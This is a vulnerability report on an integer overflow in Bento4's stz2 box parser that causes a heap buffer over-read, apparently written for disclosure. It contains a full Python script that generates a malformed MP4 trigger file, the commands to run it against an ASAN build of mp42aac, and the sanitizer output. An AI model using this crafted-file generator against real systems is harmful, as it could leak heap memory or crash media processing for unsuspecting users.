## Bug0: AP4_Stz2Atom Integer Overflow Leading to Heap Buffer Over-read

In `AP4_Stz2Atom::AP4_Stz2Atom()` in `Ap4Stz2Atom.cpp`, the expression `table_size = (sample_count * m_FieldSize + 7) / 8` performs a 32-bit unsigned multiplication that wraps to zero when `field_size=16` and `sample_count=0x10000000`, bypassing the bounds check and causing the subsequent loop to read 268,435,456 entries from a zero-byte heap allocation.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT_FILE = "poc_input.mp4"


def box(box_type, payload):
    if isinstance(box_type, str):
        box_type = box_type.encode('ascii')
    size = 8 + len(payload)
    return struct.pack('>I', size) + box_type + payload


def fullbox(box_type, version, flags, payload):
    return box(box_type, struct.pack('>B', version) + struct.pack('>I', flags)[1:] + payload)


def make_ftyp():
    payload = b'isom'
    payload += struct.pack('>I', 0x200)
    payload += b'isom'
    payload += b'iso2'
    payload += b'mp41'
    return box('ftyp', payload)


def make_mvhd():
    payload = struct.pack('>I', 0)
    payload += struct.pack('>I', 0)
    payload += struct.pack('>I', 1000)
    payload += struct.pack('>I', 1000)
    payload += struct.pack('>I', 0x00010000)
    payload += struct.pack('>H', 0x0100)
    payload += b'\x00' * 10
    payload += struct.pack('>I', 0x00010000) + struct.pack('>I', 0) + struct.pack('>I', 0)
    payload += struct.pack('>I', 0) + struct.pack('>I', 0x00010000) + struct.pack('>I', 0)
    payload += struct.pack('>I', 0) + struct.pack('>I', 0) + struct.pack('>I', 0x40000000)
    payload += b'\x00' * 24
    payload += struct.pack('>I', 2)
    return fullbox('mvhd', 0, 0, payload)


def make_tkhd():
    payload = struct.pack('>I', 0)
    payload += struct.pack('>I', 0)
    payload += struct.pack('>I', 1)
    payload += struct.pack('>I', 0)
    payload += struct.pack('>I', 1000)
    payload += b'\x00' * 8
    payload += struct.pack('>H', 0)
    payload += struct.pack('>H', 0)
    payload += struct.pack('>H', 0x0100)
    payload += struct.pack('>H', 0)
    payload += struct.pack('>I', 0x00010000) + struct.pack('>I', 0) + struct.pack('>I', 0)
    payload += struct.pack('>I', 0) + struct.pack('>I', 0x00010000) + struct.pack('>I', 0)
    payload += struct.pack('>I', 0) + struct.pack('>I', 0) + struct.pack('>I', 0x40000000)
    payload += struct.pack('>I', 0)
    payload += struct.pack('>I', 0)
    return fullbox('tkhd', 0, 3, payload)


def make_mdhd():
    payload = struct.pack('>I', 0)
    payload += struct.pack('>I', 0)
    payload += struct.pack('>I', 44100)
    payload += struct.pack('>I', 44100)
    payload += struct.pack('>H', 0x55C4)
    payload += struct.pack('>H', 0)
    return fullbox('mdhd', 0, 0, payload)


def make_hdlr():
    payload = struct.pack('>I', 0)
    payload += b'soun'
    payload += b'\x00' * 12
    payload += b'Sound Handler\x00'
    return fullbox('hdlr', 0, 0, payload)


def make_smhd():
    payload = struct.pack('>H', 0)
    payload += struct.pack('>H', 0)
    return fullbox('smhd', 0, 0, payload)


def make_dref():
    url_payload = b'\x00'
    url_entry = fullbox('url ', 0, 1, url_payload)
    dref_payload = struct.pack('>I', 1) + url_entry
    return fullbox('dref', 0, 0, dref_payload)


def make_dinf():
    return box('dinf', make_dref())


def make_stsd():
    se_reserved = b'\x00' * 6
    se_data_ref = struct.pack('>H', 1)
    audio_reserved = b'\x00' * 8
    channel_count = struct.pack('>H', 2)
    sample_size = struct.pack('>H', 16)
    pre_defined = struct.pack('>H', 0)
    reserved2 = struct.pack('>H', 0)
    sample_rate = struct.pack('>I', 44100 << 16)
    mp4a_payload = se_reserved + se_data_ref + audio_reserved + channel_count + sample_size + pre_defined + reserved2 + sample_rate
    mp4a_box = box('mp4a', mp4a_payload)
    stsd_payload = struct.pack('>I', 1) + mp4a_box
    return fullbox('stsd', 0, 0, stsd_payload)


def make_stts():
    return fullbox('stts', 0, 0, struct.pack('>I', 0))


def make_stsc():
    return fullbox('stsc', 0, 0, struct.pack('>I', 0))


def make_stsz():
    payload = struct.pack('>I', 0)
    payload += struct.pack('>I', 0)
    return fullbox('stsz', 0, 0, payload)


def make_stco():
    return fullbox('stco', 0, 0, struct.pack('>I', 0))


def make_stz2():
    box_type = bytes([0x73, 0x74, 0x7A, 0x32])  # 'stz2'
    version = 0
    flags = 0
    reserved = b'\x00\x00\x00'
    field_size = 16       # causes overflow: 0x10000000 * 16 = 0x100000000 -> wraps to 0
    sample_count = 0x10000000  # 268435456 samples

    payload = struct.pack('>B', version)
    payload += struct.pack('>I', flags)[1:]
    payload += reserved
    payload += struct.pack('>B', field_size)
    payload += struct.pack('>I', sample_count)
    # no entry data: forces OOB read from the zero-byte buffer

    size = 8 + len(payload)
    return struct.pack('>I', size) + box_type + payload


def make_stbl():
    payload = make_stsd()
    payload += make_stts()
    payload += make_stsc()
    payload += make_stsz()
    payload += make_stco()
    payload += make_stz2()
    return box('stbl', payload)


def make_minf():
    payload = make_smhd()
    payload += make_dinf()
    payload += make_stbl()
    return box('minf', payload)


def make_mdia():
    payload = make_mdhd()
    payload += make_hdlr()
    payload += make_minf()
    return box('mdia', payload)


def make_trak():
    payload = make_tkhd()
    payload += make_mdia()
    return box('trak', payload)


def make_moov():
    payload = make_mvhd()
    payload += make_trak()
    return box('moov', payload)


def main():
    mp4_data = make_ftyp()
    mp4_data += make_moov()
    with open(OUTPUT_FILE, 'wb') as f:
        f.write(mp4_data)
    print(f"Written {len(mp4_data)} bytes to {OUTPUT_FILE}")


if __name__ == '__main__':
    main()
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000191 at pc 0x5612d099bb62 bp 0x7fff8178f570 sp 0x7fff8178f560
READ of size 1 at heap address 0x502000000191 (past end of 0-byte buffer)
SUMMARY: AddressSanitizer: heap-buffer-overflow in AP4_Stz2Atom::AP4_Stz2Atom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&)

### Impact

An attacker can supply a crafted MP4 file containing a malicious `stz2` box to trigger a 268,435,456-iteration heap buffer over-read, leaking adjacent heap memory that may contain sensitive data such as pointers, keys, or other in-memory structures. The vulnerability is reachable through the standard mp42aac file-processing invocation on any untrusted MP4 input with no authentication or special privileges required. In the worst case the over-read causes a segmentation fault, resulting in denial of service of the conversion process.
